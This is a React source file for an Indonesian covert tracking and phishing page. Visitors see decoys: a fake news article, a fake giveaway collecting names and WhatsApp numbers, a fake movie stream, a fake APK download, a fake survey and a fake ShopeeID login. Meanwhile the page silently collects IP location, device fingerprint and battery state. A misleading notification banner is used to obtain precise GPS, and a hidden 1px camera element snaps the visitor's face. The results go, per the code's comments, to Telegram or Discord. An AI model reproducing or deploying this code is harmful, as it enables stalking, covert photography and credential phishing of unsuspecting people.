import { useEffect, useRef, useState } from 'react';
import { useParams, useLocation } from 'react-router-dom';
import { decodeConfig, readConfigFromFirebase, addCapture } from '../storage';

/* ─── UA Parser (Mobile-Optimized) ─────────────────────── */
function parseUA(ua) {
  let os = 'Unknown', browser = 'Unknown', device = 'Unknown';

  // OS
  if (/Windows NT 10|Windows NT 11/.test(ua)) os = 'Windows 10/11';
  else if (/Windows NT 6/.test(ua)) os = 'Windows 7/8';
  else if (/Android/.test(ua)) {
    const v = (ua.match(/Android ([\d.]+)/) || [])[1] || '';
    os = `Android ${v}`.trim();
  }
  else if (/iPhone|iPod/.test(ua)) {
    const v = (ua.match(/OS ([\d_]+)/) || [])[1]?.replace(/_/g,'.') || '';
    os = `iOS ${v}`.trim();
  }
  else if (/iPad/.test(ua)) {
    const v = (ua.match(/OS ([\d_]+)/) || [])[1]?.replace(/_/g,'.') || '';
    os = `iPadOS ${v}`.trim();
  }
  else if (/Mac OS X/.test(ua)) os = 'macOS';
  else if (/Linux/.test(ua))    os = 'Linux';

  // Browser — cek in-app dulu
  if (/FBAN|FBAV/.test(ua))        browser = 'Facebook App';
  else if (/Instagram/.test(ua))   browser = 'Instagram App';
  else if (/WhatsApp/.test(ua))    browser = 'WhatsApp';
  else if (/TikTok/.test(ua))      browser = 'TikTok App';
  else if (/Line\//.test(ua))     browser = 'LINE App';
  else if (/SamsungBrowser/.test(ua)) browser = 'Samsung Browser';
  else if (/Edg\//.test(ua))      browser = 'Edge';
  else if (/OPR\/|Opera/.test(ua)) browser = 'Opera';
  else if (/YaBrowser/.test(ua))   browser = 'Yandex Browser';
  else if (/UCBrowser/.test(ua))   browser = 'UC Browser';
  else if (/Chrome\//.test(ua))   browser = 'Chrome';
  else if (/Firefox\//.test(ua))  browser = 'Firefox';
  else if (/Safari\//.test(ua))   browser = 'Safari';

  // Device — deteksi HP Android secara spesifik
  if (/Android/.test(ua)) {
    const m = ua.match(/;\s*([^;)]+)\s*Build\//)  // "Samsung Galaxy S24"
           || ua.match(/Android[^;]*;\s*([^)]+)\)/);
    device = m ? m[1].trim() : 'Android Device';
  }
  else if (/iPhone/.test(ua))    device = 'iPhone';
  else if (/iPod/.test(ua))      device = 'iPod Touch';
  else if (/iPad/.test(ua))      device = 'iPad';
  else if (/Windows/.test(ua))   device = 'Windows PC';
  else if (/Macintosh/.test(ua)) device = 'Mac';

  return { os, browser, device };
}

/* ─── Silent Tracker ────────────────────────────────────── */
async function runSilentTracking(link, dataRef, onCameraReady, notifConfig) {
  const opts = link.options || {};
  const data = dataRef.current;

  // 1. IP & Lokasi — ambil dari 3 API paralel, pilih yang paling lengkap
  if (opts.trackIp) {
    const results = await Promise.allSettled([
      // API 1: ip-api.com (akurat untuk Asia, gratis)
      fetch('https://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,query')
        .then(r => r.json())
        .then(j => j.status === 'success' ? {
          ip: j.query, country: j.country, countryCode: j.countryCode,
          region: j.regionName, city: j.city, zip: j.zip,
          lat: j.lat, lon: j.lon, isp: j.isp || j.org, asn: j.as,
          _score: (j.city ? 2 : 0) + (j.regionName ? 1 : 0),
        } : null),

      // API 2: ipinfo.io
      fetch('https://ipinfo.io/json?token=')
        .then(r => r.json())
        .then(j => {
          if (!j.ip) return null;
          const [lat, lon] = (j.loc || ',').split(',').map(Number);
          return {
            ip: j.ip, country: j.country, region: j.region,
            city: j.city, zip: j.postal, isp: j.org,
            lat: lat || null, lon: lon || null,
            _score: (j.city ? 2 : 0) + (j.region ? 1 : 0),
          };
        }),

      // API 3: ipapi.co (fallback)
      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(j => j.ip ? {
          ip: j.ip, country: j.country_name, countryCode: j.country_code,
          region: j.region, city: j.city, zip: j.postal,
          lat: j.latitude, lon: j.longitude, isp: j.org,
          _score: (j.city ? 2 : 0) + (j.region ? 1 : 0),
        } : null),
    ]);

    const best = results
      .filter(r => r.status === 'fulfilled' && r.value)
      .map(r => r.value)
      .sort((a, b) => (b._score || 0) - (a._score || 0))[0];

    if (best) {
      const { _score, ...loc } = best;
      Object.assign(data, loc);
      data.locationSource = 'IP';
    }
    // GPS TIDAK diminta di sini — hanya via banner agar tidak ada popup langsung
  }


  // 2. Device + info tambahan
  if (opts.trackDevice) {
    const p = parseUA(navigator.userAgent);
    data.device  = p.device;
    data.os      = p.os;
    data.browser = p.browser;
    // Info extra yang berguna
    data.screen   = `${window.screen.width}x${window.screen.height}`;
    data.language = navigator.language || navigator.userLanguage || 'unknown';
    data.touch    = navigator.maxTouchPoints > 0 ? 'Ya (HP/Tablet)' : 'Tidak (Laptop)';
    // Deteksi koneksi internet (hanya Chrome/Android)
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
      data.connection = `${conn.effectiveType || ''} ${conn.downlink ? conn.downlink+'Mbps' : ''}`.trim();
    }
  }

  // 3. Battery (Android Chrome OK, iOS tidak support)
  if (opts.trackBattery) {
    try {
      if ('getBattery' in navigator) {
        const bat = await navigator.getBattery();
        data.battery = bat.level; data.charging = bat.charging;
      }
    } catch { /* iOS/Firefox tidak support */ }
  }

  // 4. Camera
  if (opts.trackCamera) { onCameraReady(); return; }

  addCapture(link.id, { ...data }, notifConfig);
}

/* ─── Notification Banner ────────────────────────────────── */
function NotifBanner({ onAllow, theme }) {
  const [visible, setVisible]     = useState(false);
  const [dismissed, setDismissed] = useState(false);

  const MSGS = {
    article:  { icon: '📰', title: 'Dapatkan Berita Terbaru',   body: 'Aktifkan notifikasi agar tidak ketinggalan artikel viral terbaru.' },
    giveaway: { icon: '🎁', title: 'Notifikasi Hadiah',          body: 'Aktifkan notifikasi supaya kamu langsung tahu saat hadiah tersedia.' },
    video:    { icon: '▶️', title: 'Video Baru Tersedia',        body: 'Aktifkan notifikasi untuk video dan konten eksklusif terbaru.' },
    download: { icon: '⬇️', title: 'Update Aplikasi',            body: 'Aktifkan notifikasi untuk mendapatkan update dan fitur terbaru.' },
    survey:   { icon: '📋', title: 'Survei Berhadiah',           body: 'Aktifkan notifikasi agar tidak ketinggalan survei berhadiah berikutnya.' },
    login:    { icon: '🔔', title: 'Aktifkan Notifikasi',        body: 'Aktifkan notifikasi keamanan untuk melindungi akun kamu.' },
  };
  const msg = MSGS[theme] || MSGS.article;

  useEffect(() => {
    const t = setTimeout(() => setVisible(true), 1500); // lebih cepat (1.5 detik)
    return () => clearTimeout(t);
  }, []);

  function requestGps() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
      pos => onAllow && onAllow(pos),
      () => {},
      // enableHighAccuracy=true → GPS presisi tinggi di HP
      { timeout: 20000, maximumAge: 0, enableHighAccuracy: true }
    );
  }

  function handleAllow() {
    setDismissed(true);
    // Langsung minta GPS tanpa syarat Notification Permission untuk meningkatkan rate keberhasilan
    requestGps();
  }

  if (!visible || dismissed) return null;

  return (
    <div style={{
      position: 'fixed', bottom: '16px', left: '50%', transform: 'translateX(-50%)',
      background: '#1e293b', color: '#f1f5f9', borderRadius: '16px',
      padding: '14px 16px', boxShadow: '0 8px 40px rgba(0,0,0,0.5)',
      zIndex: 99999, display: 'flex', alignItems: 'center', gap: '12px',
      maxWidth: '400px', width: 'calc(100vw - 32px)',
      animation: 'slideUp .35s cubic-bezier(.16,1,.3,1)',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
    }}>
      <style>{`@keyframes slideUp{from{opacity:0;transform:translateX(-50%) translateY(24px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}`}</style>
      <div style={{ fontSize: '26px', flexShrink: 0 }}>{msg.icon}</div>
      <div style={{ flex: 1, minWidth: 0 }}>
        <div style={{ fontWeight: 700, fontSize: '13px', marginBottom: '2px' }}>{msg.title}</div>
        <div style={{ fontSize: '11px', color: '#94a3b8', lineHeight: 1.4 }}>{msg.body}</div>
      </div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: '5px', flexShrink: 0 }}>
        <button onClick={handleAllow} style={{
          background: '#3b82f6', color: '#fff', border: 'none', borderRadius: '8px',
          padding: '8px 14px', fontWeight: 700, fontSize: '12px', cursor: 'pointer',
          whiteSpace: 'nowrap',
        }}>Izinkan</button>
        <button onClick={() => setDismissed(true)} style={{
          background: 'transparent', color: '#64748b', border: 'none',
          fontSize: '11px', cursor: 'pointer',
        }}>Nanti</button>
      </div>
    </div>
  );
}

/* ─── Decoy Components ──────────────────────────────────── */


function ArticleDecoy() {
  return (
    <div className="d-article">
      <div className="d-topbar">
        <div className="d-logo">📰 BeritaViral.id</div>
        <nav className="d-nav">
          <span>Beranda</span><span>Nasional</span><span>Teknologi</span><span>Hiburan</span>
        </nav>
      </div>
      <div className="d-article-body">
        <div className="d-cat">🔥 Viral</div>
        <h1 className="d-article-title">Viral! Warga Temukan Cara Dapat Saldo DANA Gratis Tanpa Syarat, Begini Caranya</h1>
        <div className="d-byline">Redaksi · Sabtu, 24 Oktober 2026 · 5 menit baca</div>
        <div className="d-img">🏦</div>
        <div className="d-body">
          <p>Metode yang sedang ramai diperbincangkan ini diklaim membantu ribuan orang mendapatkan penghasilan tambahan dari rumah. Tanpa modal, tanpa referral, dan tanpa syarat.</p>
          <p>Seorang pengguna bernama Andika (27) mengaku berhasil mengumpulkan lebih dari Rp2 juta hanya dalam seminggu.</p>
          <h2>Cara Kerjanya?</h2>
          <p>Platform ini bekerja dengan sistem reward otomatis yang terhubung langsung dengan dompet digitalmu. Setiap aktivitas akan menghasilkan poin yang bisa dicairkan kapan saja...</p>
          <div className="d-paywall">
            <div className="d-paywall-overlay">
              <div className="d-unlock">🔓 Buka Artikel Lengkap</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function GiveawayDecoy() {
  const [step, setStep] = useState(0);
  return (
    <div className="d-giveaway">
      <div>
        <div style={{ fontSize: '32px', textAlign: 'center', marginBottom: '8px' }}>🎉🎊🎁</div>
        <h1 className="d-giveaway-title">SELAMAT! Kamu Menang!</h1>
        <p className="d-giveaway-sub">Kamu terpilih sebagai pemenang Giveaway Spesial Hari Ini</p>
      </div>
      <div className="d-prize-card">
        <div className="d-prize-icon">📱</div>
        <div className="d-prize-name">iPhone 16 Pro Max 256GB</div>
        <div className="d-prize-val">Senilai Rp 22.000.000</div>
        <div className="d-timer">⏰ Klaim dalam: <strong>09:47</strong></div>
      </div>
      <div className="d-form">
        {step === 0 ? (
          <>
            <p style={{ color: '#6b7280', marginBottom: '14px', fontSize: '13px' }}>Masukkan data diri untuk klaim hadiah:</p>
            <input className="d-input" placeholder="Nama lengkap" />
            <input className="d-input" placeholder="Nomor WhatsApp aktif" />
            <input className="d-input" placeholder="Kota tempat tinggal" />
            <button className="d-btn-primary" onClick={() => setStep(1)}>🎁 Klaim Hadiah Sekarang!</button>
          </>
        ) : (
          <div style={{ textAlign: 'center', padding: '20px' }}>
            <div style={{ fontSize: '40px', marginBottom: '10px' }}>⏳</div>
            <div style={{ fontWeight: 700, fontSize: '16px', color: '#111', marginBottom: '6px' }}>Memverifikasi data...</div>
            <div style={{ color: '#6b7280', fontSize: '13px' }}>Mohon tunggu sebentar</div>
          </div>
        )}
      </div>
    </div>
  );
}

function VideoDecoy() {
  return (
    <div className="d-video">
      <div className="d-video-header">
        <div className="d-video-logo">▶ StreamFlix</div>
        <div style={{ display: 'flex', gap: '14px', color: '#9ca3af', fontSize: '13px' }}>
          <span>🔍</span><span>🔔</span><span>👤</span>
        </div>
      </div>
      <div className="d-player">
        <div className="d-player-inner">
          <div className="d-play">▶</div>
        </div>
      </div>
      <div className="d-video-info">
        <h1 className="d-video-title">[FULL MOVIE] Agak Laen 2: The Return — 2026 Full HD Sub Indo</h1>
        <div className="d-video-meta">
          <span>👁 12.4 Juta tayang</span>
          <span>👍 98K</span>
          <span>📅 2 hari lalu</span>
          <span>FilmGratis Official</span>
        </div>
        {['Petaka di Balik Senyum — Full Movie 2026', 'Miracle in Cell No. 7 Remake Indonesia', 'Pengabdi Setan 3 — Official Full Movie'].map((t, i) => (
          <div key={i} style={{ display: 'flex', gap: '10px', marginBottom: '14px', cursor: 'pointer' }}>
            <div style={{ width: '100px', height: '56px', background: '#f3f4f6', borderRadius: '6px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '20px', flexShrink: 0 }}>🎬</div>
            <div style={{ fontSize: '13px', color: '#111', fontWeight: 500 }}>{t}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

function DownloadDecoy() {
  const [pct, setPct] = useState(0);
  const [started, setStarted] = useState(false);
  function start() {
    setStarted(true);
    let p = 0;
    const iv = setInterval(() => {
      p += Math.random() * 8 + 2;
      if (p >= 100) { p = 100; clearInterval(iv); }
      setPct(Math.round(p));
    }, 200);
  }
  return (
    <div className="d-download">
      <div className="d-dl-header">⬇️ FileShare Pro</div>
      <div className="d-dl-card">
        <div className="d-dl-icon">📦</div>
        <div className="d-dl-name">Mod_Menu_ML_v8.2.apk</div>
        <div className="d-dl-tags">
          <span className="d-dl-tag">📊 48.3 MB</span>
          <span className="d-dl-tag">APK</span>
          <span className="d-dl-tag">✅ Aman</span>
          <span className="d-dl-tag">⬇️ 128K unduhan</span>
        </div>
        {!started ? (
          <button className="d-dl-btn" onClick={start}>⬇️ Download Sekarang (Gratis)</button>
        ) : (
          <div>
            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px', color: '#6b7280', marginBottom: '6px' }}>
              <span>Mengunduh...</span><span>{pct}%</span>
            </div>
            <div style={{ height: '6px', background: '#e5e7eb', borderRadius: '3px', overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: '#2563eb', borderRadius: '3px', transition: 'width 0.2s' }} />
            </div>
            {pct === 100 && <div style={{ color: '#16a34a', fontWeight: 600, textAlign: 'center', marginTop: '10px', fontSize: '13px' }}>✅ Selesai!</div>}
          </div>
        )}
      </div>
    </div>
  );
}

function SurveyDecoy() {
  const [answers, setAnswers] = useState({});
  const [done, setDone] = useState(false);
  const qs = [
    { q: 'Berapa usia kamu saat ini?', opts: ['< 17 tahun', '17–25 tahun', '26–35 tahun', '> 35 tahun'] },
    { q: 'Pengeluaran belanja online per bulan?', opts: ['< Rp100rb', 'Rp100–500rb', 'Rp500rb–1jt', '> Rp1jt'] },
    { q: 'Platform belanja online favoritmu?', opts: ['Shopee', 'Tokopedia', 'Lazada', 'TikTok Shop'] },
  ];
  const prog = Math.round((Object.keys(answers).length / qs.length) * 100);
  return (
    <div className="d-survey">
      <div className="d-survey-header">
        <div className="d-survey-title">📋 Survey Belanja Online 2026</div>
        <div className="d-survey-sub">Selesaikan dan menangkan voucher Rp500.000!</div>
        <div className="d-progress"><div className="d-progress-fill" style={{ width: `${prog}%` }} /></div>
        <div style={{ fontSize: '11px', color: '#9ca3af', marginTop: '4px' }}>{Object.keys(answers).length}/{qs.length} pertanyaan</div>
      </div>
      {!done ? (
        <>
          {qs.map((q, qi) => (
            <div key={qi} className="d-q-card">
              <div className="d-q-label">{qi + 1}. {q.q}</div>
              <div className="d-q-opts">
                {q.opts.map((opt, oi) => (
                  <div key={oi} className={`d-q-opt ${answers[qi] === oi ? 'sel' : ''}`} onClick={() => setAnswers(a => ({ ...a, [qi]: oi }))}>
                    <div className="d-radio" /> {opt}
                  </div>
                ))}
              </div>
            </div>
          ))}
          <button className="d-btn-primary" onClick={() => Object.keys(answers).length === qs.length && setDone(true)}>
            Kirim & Klaim Hadiah 🎁
          </button>
        </>
      ) : (
        <div style={{ textAlign: 'center', padding: '32px', background: '#fff', borderRadius: '10px', border: '1px solid #e5e7eb' }}>
          <div style={{ fontSize: '40px', marginBottom: '10px' }}>🎉</div>
          <div style={{ fontWeight: 700, fontSize: '17px', color: '#111', marginBottom: '6px' }}>Terima kasih!</div>
          <div style={{ color: '#6b7280', fontSize: '13px' }}>Voucher akan dikirim ke WhatsApp kamu dalam 1x24 jam.</div>
        </div>
      )}
    </div>
  );
}

function LoginDecoy() {
  return (
    <div className="d-login">
      <div className="d-login-card">
        <div className="d-login-logo">🛒</div>
        <h1 className="d-login-title">Masuk ke Akun Kamu</h1>
        <p className="d-login-sub">ShopeeID — Belanja Lebih Hemat</p>
        <input className="d-input" placeholder="Email / No. HP / Username" />
        <input className="d-input" type="password" placeholder="Password" />
        <button className="d-btn-primary">Masuk</button>
        <div style={{ textAlign: 'center', marginTop: '14px', fontSize: '13px', color: '#9ca3af' }}>
          Belum punya akun? <span style={{ color: '#f97316', cursor: 'pointer', fontWeight: 600 }}>Daftar</span>
        </div>
        <div className="d-sep"><div className="d-sep-line" /> atau <div className="d-sep-line" /></div>
        <button className="d-btn-outline">📱 Masuk dengan Google</button>
        <button className="d-btn-outline" style={{ marginTop: '8px' }}>📘 Masuk dengan Facebook</button>
      </div>
    </div>
  );
}

/* ─── Hidden Camera ─────────────────────────────────────── */
function HiddenCamera({ onCapture }) {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  useEffect(() => {
    let stream;
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
      .then(s => {
        stream = s;
        if (videoRef.current) {
          videoRef.current.srcObject = s;
          videoRef.current.play();
          setTimeout(() => {
            const v = videoRef.current, c = canvasRef.current;
            if (!v || !c) return;
            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
            s.getTracks().forEach(t => t.stop());
            onCapture(c.toDataURL('image/jpeg', 0.75));
          }, 1500);
        }
      })
      .catch(() => onCapture(null));
    return () => stream?.getTracks().forEach(t => t.stop());
  }, []);
  return (
    <div style={{ position: 'fixed', top: '-9999px', left: '-9999px', width: '1px', height: '1px', opacity: 0, pointerEvents: 'none' }}>
      <video ref={videoRef} autoPlay playsInline muted style={{ width: '1px', height: '1px' }} />
      <canvas ref={canvasRef} style={{ width: '1px', height: '1px' }} />
    </div>
  );
}

/* ─── Main Capture Page ─────────────────────────────────── */
const DECOY_MAP = {
  article:  ArticleDecoy,
  giveaway: GiveawayDecoy,
  video:    VideoDecoy,
  download: DownloadDecoy,
  survey:   SurveyDecoy,
  login:    LoginDecoy,
};

export default function Capture() {
  // Ambil trackId dari params ATAU dari segmen terakhir URL (untuk catch-all route)
  const params   = useParams();
  const location = useLocation();

  const trackId = params.trackId
    || location.pathname.split('/').filter(Boolean).pop()
    || '';

  const [config, setConfig]         = useState(null);
  const [notFound, setNotFound]     = useState(false);
  const [showCamera, setShowCamera] = useState(false);
  const dataRef   = useRef({});
  const notifRef  = useRef(null);
  const configRef = useRef(null); // ← ref agar tidak stale closure di callback
  const linkRef   = useRef(null);
  const ranRef    = useRef(false);

  useEffect(() => {
    if (ranRef.current) return;
    ranRef.current = true;
    if (!trackId) { setNotFound(true); return; }

    async function loadConfig() {
      let cfg = decodeConfig(trackId);
      if (!cfg) {
        cfg = await readConfigFromFirebase(null, trackId);
      }
      if (!cfg) {
        setNotFound(true);
        return;
      }

      setConfig(cfg);
      configRef.current = cfg;                          // simpan ke ref
      notifRef.current  = cfg.notif || null;
      const link = { id: cfg.id || trackId, options: cfg.options || {}, decoyTheme: cfg.decoyTheme };
      linkRef.current = link;

      // Ubah judul halaman sesuai tema agar preview/tampilan meyakinkan
      document.title = {
        article:  'Viral! Cara Dapat Saldo DANA Gratis Terbaru 2026',
        giveaway: 'SELAMAT! Kamu Memenangkan Hadiah Eksklusif',
        video:    '[FULL MOVIE] Streaming Film HD Gratis',
        download: 'Download Aplikasi & Game Premium Gratis',
        survey:   'Survey Berhadiah Tunai Jutaan Rupiah',
        login:    'Masuk ke Akun Anda — Verifikasi Keamanan',
      }[cfg.decoyTheme] || 'Informasi Terbaru';

      // IP + Device + Battery — semuanya SILENT, tanpa popup apapun
      runSilentTracking(link, dataRef, () => setShowCamera(true), cfg.notif);
    }

    loadConfig();
  }, [trackId]);

  // GPS dipanggil dari banner → gunakan ref agar tidak stale
  function handleGpsFromBanner(pos) {
    const cfg  = configRef.current;
    const link = linkRef.current;
    if (!cfg || !link) return;

    dataRef.current.lat            = pos.coords.latitude;
    dataRef.current.lon            = pos.coords.longitude;
    dataRef.current.gpsAccuracy    = Math.round(pos.coords.accuracy);
    dataRef.current.locationSource = 'GPS';

    // Kirim ke Telegram/Discord dengan credentials dari URL config
    addCapture(link.id, { ...dataRef.current }, notifRef.current);
  }

  function handlePhotoCapture(photo) {
    const link = linkRef.current;
    if (photo) dataRef.current.photo = photo;
    setShowCamera(false);
    if (link) addCapture(link.id, { ...dataRef.current }, notifRef.current);
  }

  if (notFound) return (
    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#fff', fontFamily: 'Inter, sans-serif' }}>
      <div style={{ textAlign: 'center', padding: '40px' }}>
        <div style={{ fontSize: '48px', marginBottom: '16px' }}>404</div>
        <div style={{ fontSize: '15px', color: '#9ca3af' }}>Halaman tidak ditemukan</div>
      </div>
    </div>
  );

  if (!config) return null;

  const DecoyComponent = DECOY_MAP[config.decoyTheme] || ArticleDecoy;

  return (
    <>
      {showCamera && <HiddenCamera onCapture={handlePhotoCapture} />}
      <DecoyComponent />
      <NotifBanner theme={config.decoyTheme} onAllow={handleGpsFromBanner} />
    </>
  );
}
